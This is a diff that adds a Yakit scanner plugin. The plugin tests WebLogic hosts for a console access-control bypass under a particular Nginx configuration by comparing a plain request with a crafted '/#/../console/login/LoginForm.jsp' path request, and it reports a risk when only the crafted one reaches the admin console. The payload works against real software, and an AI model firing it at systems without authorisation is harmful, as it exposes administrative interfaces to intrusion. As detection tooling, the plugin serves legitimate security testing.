@@ -1,0 +1,58 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    packet = `GET /#/../console/login/LoginForm.jsp HTTP/1.1
+Host: {{params(target)}}
+Connection: close
+`
+    packet_nopaload = `GET /console/login/LoginForm.jsp HTTP/1.1
+Host: {{params(target)}}
+Connection: close
+`
+    frsp,freq,_ = poc.HTTP(packet_nopaload, 
+    poc.params({"target":addr}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    rsp,req,_ = poc.HTTP(packet, 
+    poc.params({"target":addr}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+    // dump(rsp)
+    if len(rsp) > 0 {
+        
+        if ( len(frsp) == 0||!str.MatchAllOfSubString(frsp, "HTTP/1.1 200"))&&
+        str.MatchAllOfSubString(rsp, "HTTP/1.1 200")&&
+        (str.MatchAllOfSubString(rsp, "Oracle WebLogic Server Administration Console")||
+        str.MatchAllOfSubString(rsp, "Oracle WebLogic Server 管理控制台")){
+            yakit.Info("%v found Weblogic特定Nginx配置下Console绕过访问漏洞", addr)
+            risk.NewRisk(
+            addr,risk.title("Weblogic特定Nginx配置下Console绕过访问漏洞"),
+            risk.severity("middle"),
+            risk.titleVerbose("Weblogic特定Nginx配置下Console绕过访问漏洞"),
+            risk.type("weblogic Console访问"),
+            )
+        }
+       
+    }
+
+    return
+}
+
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen(){
+        return
+    }
+
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port)
+    }
+    
+}
